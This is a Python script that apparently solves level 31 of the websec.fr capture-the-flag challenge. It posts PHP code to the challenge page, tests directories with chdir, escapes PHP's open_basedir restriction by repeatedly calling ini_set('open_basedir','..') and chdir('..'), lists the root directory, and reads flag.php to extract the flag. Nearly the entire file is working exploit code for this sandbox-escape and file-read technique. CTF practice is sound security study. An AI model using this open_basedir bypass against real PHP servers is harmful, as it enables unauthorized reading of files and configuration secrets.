from requests import *

url = 'https://websec.fr/level31/index.php'
dic = ['./bin' , 
        './boot' ,
        './cdrom' , 
        './dev' , 
        './etc' , 
        './home' , 
        './lib' , 
        './lost+found'  ,
        './media' ,
        './mnt' , 
        './opt' , 
        './proc' , 
        './root' , 
        './run' , 
        './sbin' , 
        './selinux' , 
        './srv' , 
        './tmp' , 
        './usr' , 
        './var']
available_file = ''
for file in dic :
    params = {
        'c' : "chdir('{0}');".format(file),
        'submit' : 'Submit'
    }
    r = post(url , params=params)
    if (r.text.find('Warning') == -1):
        print(file)
        available_file = file
        break

params = {
    'c' : "chdir('{0}');  ini_set('open_basedir','..'); chdir('..'); chdir('..'); ini_set('open_basedir','/');  var_dump(scandir('/'));".format(available_file),
    'submit' : 'Submit'
}
r = post(url , params=params)
print(r.text)

params = {
    'c' : "chdir('{0}');  ini_set('open_basedir','..'); chdir('..'); chdir('..'); ini_set('open_basedir','/');  var_dump(file_get_contents('./flag.php'));".format(available_file),
    'submit' : 'Submit'
}
r = post(url , params=params)
pos = r.text.find('WEBSEC{')
while(True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1